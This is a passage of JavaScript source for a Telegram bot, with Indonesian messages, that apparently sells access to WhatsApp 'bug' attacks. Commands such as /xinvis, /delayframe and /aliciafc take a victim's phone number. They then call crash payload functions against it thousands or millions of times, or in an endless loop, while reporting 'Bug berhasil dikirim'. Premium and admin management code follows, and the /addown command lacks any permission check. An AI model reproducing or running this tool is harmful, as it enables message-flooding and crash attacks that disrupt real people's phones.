      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/azpl5o.jpg", {
      caption: `
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[323333m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 2000000; i++) {
    await CheEseXInvis(jid);
    }
    console.log("\x1b[323333m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : Success by vanznewera
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/xinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`ʟᴀʜʜ ʟᴜ sɪᴀᴘᴀ?\`\`\`
𝙏𝙄𝘿𝘼𝙆 𝘼𝘿𝘼 𝘼𝙆𝙎𝙀𝙎. 𝙎𝙄𝙇𝘼𝙃𝙆𝘼𝙉 𝘽𝙀𝙇𝙄 𝘼𝙆𝙎𝙀𝙎 𝙆𝙀 𝙊𝙒𝙉𝙀𝙍, 𝙆𝙊𝙉𝙏𝘼𝙆 𝙊𝙒𝙉𝙀𝙍 𝘿𝙄𝘽𝘼𝙒𝘼𝙃.
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/vanznewera" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/azpl5o.jpg", {
      caption: `
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[322332m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 200; i++) {
    await CheEseXInvis(jid);
    }
    console.log("\x1b[322332m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : Success by vanznewera
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/delayframe (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`ʟᴀʜʜ ʟᴜ sɪᴀᴘᴀ?\`\`\`
𝙏𝙄𝘿𝘼𝙆 𝘼𝘿𝘼 𝘼𝙆𝙎𝙀𝙎. 𝙎𝙄𝙇𝘼𝙃𝙆𝘼𝙉 𝘽𝙀𝙇𝙄 𝘼𝙆𝙎𝙀𝙎 𝙆𝙀 𝙊𝙒𝙉𝙀𝙍, 𝙆𝙊𝙉𝙏𝘼𝙆 𝙊𝙒𝙉𝙀𝙍 𝘿𝙄𝘽𝘼𝙒𝘼𝙃.
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/vanznewera" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/azpl5o.jpg", {
      caption: `
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[20002m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    while (true) {
    await CheEseXInvis(jid);
    await CheEseXInvis(jid);
    await CheEseXInvis(jid);
    await CheEseXInvis(jid);
    }
    console.log("\x1b[20002m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : Success by vanznewera
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/aliciaa (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`ʟᴀʜʜ ʟᴜ sɪᴀᴘᴀ?\`\`\`
𝙏𝙄𝘿𝘼𝙆 𝘼𝘿𝘼 𝘼𝙆𝙎𝙀𝙎. 𝙎𝙄𝙇𝘼𝙃𝙆𝘼𝙉 𝘽𝙀𝙇𝙄 𝘼𝙆𝙎𝙀𝙎 𝙆𝙀 𝙊𝙒𝙉𝙀𝙍, 𝙆𝙊𝙉𝙏𝘼𝙆 𝙊𝙒𝙉𝙀𝙍 𝘿𝙄𝘽𝘼𝙒𝘼𝙃.
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/vanznewera" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/azpl5o.jpg", {
      caption: `
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[3000000m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 40000; i++) {
    await Private02(jid);
    await Private02(jid);
    await Private02(jid);
    await Private02(jid);
    }
    console.log("\x1b[3000000m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : Success by vanznewera
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/aliciaxvanz (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`ʟᴀʜʜ ʟᴜ sɪᴀᴘᴀ?\`\`\`
𝙏𝙄𝘿𝘼𝙆 𝘼𝘿𝘼 𝘼𝙆𝙎𝙀𝙎. 𝙎𝙄𝙇𝘼𝙃𝙆𝘼𝙉 𝘽𝙀𝙇𝙄 𝘼𝙆𝙎𝙀𝙎 𝙆𝙀 𝙊𝙒𝙉𝙀𝙍, 𝙆𝙊𝙉𝙏𝘼𝙆 𝙊𝙒𝙉𝙀𝙍 𝘿𝙄𝘽𝘼𝙒𝘼𝙃.
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/vanznewera" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/azpl5o.jpg", {
      caption: `
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[3000000m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 30000; i++) {
    await Private02(jid);
    await FChyUi(jid);
    await FChyUi(jid);
    }
    console.log("\x1b[3000000m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : Success by vanznewera
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/aliciafc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`ʟᴀʜʜ ʟᴜ sɪᴀᴘᴀ?\`\`\`
𝙏𝙄𝘿𝘼𝙆 𝘼𝘿𝘼 𝘼𝙆𝙎𝙀𝙎. 𝙎𝙄𝙇𝘼𝙃𝙆𝘼𝙉 𝘽𝙀𝙇𝙄 𝘼𝙆𝙎𝙀𝙎 𝙆𝙀 𝙊𝙒𝙉𝙀𝙍, 𝙆𝙊𝙉𝙏𝘼𝙆 𝙊𝙒𝙉𝙀𝙍 𝘿𝙄𝘽𝘼𝙒𝘼𝙃.
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/vanznewera" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/azpl5o.jpg", {
      caption: `
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[3000000m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 40000; i++) {
   await FChyUi(jid);
   await FChyUi(jid);
   await FChyUi(jid);
   await FChyUi(jid);
   await FChyUi(jid);
    }
    console.log("\x1b[3000000m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# 𝐒 𝐄 𝐍 𝐃 𝐈 𝐍 𝐆 - 𝐁 𝐔 𝐆
- Target : ${formattedNumber}
- status : Success by vanznewera
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});   


//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addvip 7245356181 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addvip 7245356181 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addvip 7245356181 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - V I P \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addown(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 7245356181.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 7245356181.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delvip 7245356181");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/delown(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 7245356181.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 7245356181.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});